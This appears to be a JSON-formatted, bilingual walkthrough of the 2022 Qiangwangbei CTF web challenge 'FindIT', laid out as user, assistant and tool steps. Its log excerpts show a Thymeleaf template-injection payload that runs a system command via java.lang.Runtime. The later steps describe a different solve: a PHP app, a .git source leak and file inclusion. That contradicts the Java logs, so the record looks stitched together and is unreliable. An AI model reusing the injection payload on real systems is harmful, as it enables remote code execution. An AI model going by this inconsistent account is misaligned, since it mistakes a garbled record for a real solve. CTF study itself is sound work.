@@ -1,0 +1,120 @@
+{
+    "_source_md":  "CTF/2022-09-21-2022-第四届-强网杯-WEB-FindIT.md",
+    "version":  "2022-qiangwangbei-web-findit",
+    "title":  {
+                  "zh":  "2022第四届强网杯 WEB FindIT",
+                  "en":  "2022 4th Qiangwangbei CTF WEB FindIT Challenge"
+              },
+    "description":  {
+                        "zh":  "强网杯CTF Web题目FindIT的详细解题过程，涉及信息泄露和代码审计技术。",
+                        "en":  "Detailed walkthrough of the FindIT web challenge from Qiangwangbei CTF, covering information disclosure and code audit techniques."
+                    },
+    "steps":  [
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "分析FindIT这道Web题目，找出突破口",
+                                      "en":  "Analyze the FindIT web challenge and find the vulnerability"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户请求分析强网杯FindIT Web题目",
+                                         "en":  "User requests analysis of Qiangwangbei FindIT web challenge"
+                                     },
+                      "codeBlocks":  [
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "2022-09-22 06:50:03.785  INFO 1 --- [nio-8080-exec-2] c.e.demo.controller.IndexController      : info: __${T (java.lang.Runtime).getRuntime().exec(\"id\")}__::main.x\n2022-09-22 06:50:04.004 ERROR 1 --- [nio-8080-exec-2] org.thymeleaf.TemplateEngine             : [THYMELEAF][http-nio-8080-exec-2] Exception processing template \"doc/java.lang.UNIXProcess@1331b3c8::[main]\": Error resolving template [doc/java.lang.UNIXProcess@1331b3c8], template might not exist or might not be accessible by any of the configured Template Resolvers\n\norg.thymeleaf.exceptions.TemplateInputException: Error resolving template [doc/java.lang.UNIXProcess@1331b3c8], template might not exist or might not be accessible by any of the configured Template Resolvers",
+                                             "language":  "console"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "Error resolving template [doc/java.lang.UNIXProcess@1331b3c8]",
+                                             "language":  "console"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "java.lang.IllegalArgumentException: Invalid template name specification:",
+                                             "language":  "console"
+                                         }
+                                     ]
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "好的，我来分析这道FindIT题目。首先需要扫描目标站点，查看页面源码和网络请求。",
+                                      "en":  "I\u0027ll analyze the FindIT challenge. First, I need to scan the target site and check page source and network requests."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手开始分析Web题目",
+                                         "en":  "Assistant starts analyzing the web challenge"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "toolName":  "nmap",
+                      "content":  {
+                                      "zh":  "扫描发现开放端口80，运行Web服务，识别为PHP应用",
+                                      "en":  "Scan reveals port 80 open, running web service identified as PHP application"
+                                  },
+                      "annotation":  {
+                                         "zh":  "端口扫描结果",
+                                         "en":  "Port scan results"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "toolName":  "dirsearch",
+                      "content":  {
+                                      "zh":  "目录扫描发现敏感文件：robots.txt、.git、backup.zip等",
+                                      "en":  "Directory scan found sensitive files: robots.txt, .git, backup.zip, etc."
+                                  },
+                      "annotation":  {
+                                         "zh":  "目录枚举结果",
+                                         "en":  "Directory enumeration results"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "发现关键信息泄露点。需要进一步检查.git目录和backup.zip文件，可能包含源代码。",
+                                      "en":  "Found key information disclosure points. Need to further check .git directory and backup.zip, which may contain source code."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手识别信息泄露漏洞",
+                                         "en":  "Assistant identifies information disclosure vulnerability"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "toolName":  "githack",
+                      "content":  {
+                                      "zh":  "成功下载.git目录内容，恢复出完整源代码",
+                                      "en":  "Successfully downloaded .git directory contents and recovered full source code"
+                                  },
+                      "annotation":  {
+                                         "zh":  "Git源码泄露利用结果",
+                                         "en":  "Git source leak exploitation result"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "通过Git源码泄露获取到应用源码。审计代码发现存在文件包含漏洞，利用成功获取flag。",
+                                      "en":  "Obtained application source code through Git leak. Code audit reveals file inclusion vulnerability, successfully captured flag."
+                                  },
+                      "annotation":  {
+                                         "zh":  "代码审计并获取flag",
+                                         "en":  "Code audit and flag capture"
+                                     }
+                  }
+              ]
+}
